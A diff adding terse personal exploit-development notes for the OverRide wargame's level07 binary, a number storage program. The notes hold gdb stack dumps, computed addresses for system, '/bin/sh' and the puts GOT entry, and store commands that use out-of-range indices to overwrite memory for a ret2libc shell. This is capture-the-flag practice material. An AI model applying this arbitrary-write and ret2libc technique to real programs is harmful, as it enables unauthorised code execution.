@@ -1,0 +1,185 @@
+system = 4159090384
+
+$ebp ret = [stack] : 0xffffd52c --> 0x80488ef (<main+460>:	mov    DWORD PTR [esp+0x1b4],eax)
+					=
+				    134514927		index -10
+$ebp+8 = 0xffffd534 --> 0x14  = index -8
+
+
+
+libc : 0xf7f897ec ("/bin/sh")  = 4160264172
+
+
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd52c --> 0xf7e6aed0 (<system>:	sub    esp,0x1c)
+0004| 0xffffd530 --> 0xffffd554 --> 0x0			0xffffd554 = index 0
+0008| 0xffffd534 --> 0x14
+
+
+245	 EAX: 0xffffd928 --> 0x0
+256	 EAX: 0xffffd954 --> 0x0
+
+
+find ret add of get_unum : 0xffffd4ec  = index -26
+
+
+
+puts
+-22/\0000| 0xffffd4fc --> 0x80486a3 (<store_number+115>:	mov    DWORD PTR [esp],0x8048af8)
+0004| 0xffffd500 --> 0x8048ae6 (" *** ERROR! ***")
+
+ret main
+114/\0000| 0xffffd71c --> 0xf7e45513 (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)
+0004| 0xffffd720 --> 0x1
+
+fflush
+0000| 0xffffd4cc --> 0x8048601 (<get_unum+26>:	mov    eax,0x8048ad0)
+0004| 0xffffd4d0 --> 0xf7fcfa20 --> 0xfbad2a84
+
+
+
+__stack_chk_fail -> __fortify_fail ->  0xf7f55d73
+0000| 0xffffd4f8 --> 0xf7e6e4db (<vfprintf+11>:	add    ebx,0x160b19)
+0004| 0xffffd4fc --> 0xf7fceff4 --> 0x1a2d7c
+
+
+0000| 0xffffcf1c --> 0xf7e9c5b6 (<_IO_file_xsputn+22>:	add    ebx,0x132a3e)
+0004| 0xffffcf20 --> 0xf7fcfa20 --> 0xfbad2a84
+
+
+
+
+-------------------
+index -132 = EAX: 0xffffd344 --> 0xf7f0ac83 (<write+35>:	pop    ebx)
+
+
+
+
+
+_______________________________________________________________________________
+40 000 000 = 0x09894454
+
+
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd48c --> 0x8048930 (<main+525>:	mov    DWORD PTR [esp+0x1b4],eax)
+0004| 0xffffd490 --> 0xffffd4b4 --> 0x0
+
+
+40 000 000 = 0x09894454
+
+33632495
+33632944 i
+0x804a014  (GOT)
+
+
+0xffffd504 ebp+4  index -20
+
+
+Input command: store
+ Number: 4159090384
+ Index: 33632944
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: -20
+
+
+0004| 0xffffd504 --> 0x8048d60 --> 0x61657200 ('')
+0x8048ae6 (" *** ERROR! ***")
+0000| 0xffffd380 --> 0xf7fcfa20 --> 0xfbad2a84
+
+
+
+
+EBX: 0xf7fceff4 --> 0x1a2d7c
+
+
+
+
+
+no env :
+
+ Index(got): 33632944  -> 33632496
+
+
+
+
+args : hhhhhhhhhhhhh jjjjjjjjjjjjjjjj kkkkkkkkkkkkkkkkk
+
+33632512 -8 sans env  = 33632504  <-- ok avec level07@OverRide:/tmp$ ./env.sh ~/level07 hhhhhhhhhhhhh jjjjjjjjjjjjjjjj kkkkkkkkkkkkkkkkk
+
+
+
+----------------
+
+gdb /home/users/level07/level07
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+
+ Number: 4159090384
+ Index: 33632936
+
+Breakpoint 1, 0x080486ce in store_number ()
+(gdb) x $eax
+0x804a014 <puts@got.plt>:	0xf7e927c0
+
+
+0x8048ae6:	 " *** ERROR! ***"
+
+
+
+
+--------------------------
+
+step :
+
+./env.sh -d ~/level07
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+(gdb) unset env GG
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/users/level07/level07 hhhhhhhhhhhhh jjjjjjjjjjjjjjjj kkkkkkkkkkkkkkkkk
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 4159090384
+ Index: 33632512
+
+Breakpoint 1, 0x080486ce in store_number ()
+(gdb) x $eax
+0x804a034:	0x00000000
+(gdb) c
+Continuing.
+ Completed store command successfully
+Input command: store
+ Number: 4159090384
+ Index: 33632504
+
+Breakpoint 1, 0x080486ce in store_number ()
+(gdb) x $eax
+0x804a014 <puts@got.plt>:	0xf7e927c0
+(gdb) c
+Continuing.
+ Completed store command successfully
+Input command: store
+ Number: 0
+ Index: 0
+sh: 1: env.sh: not found
+sh: 1: This: not found
+sh: 1: env.sh: not found
+
+
+33631585
+libc : 0xf7f897ec ("/bin/sh")  = 4160264172
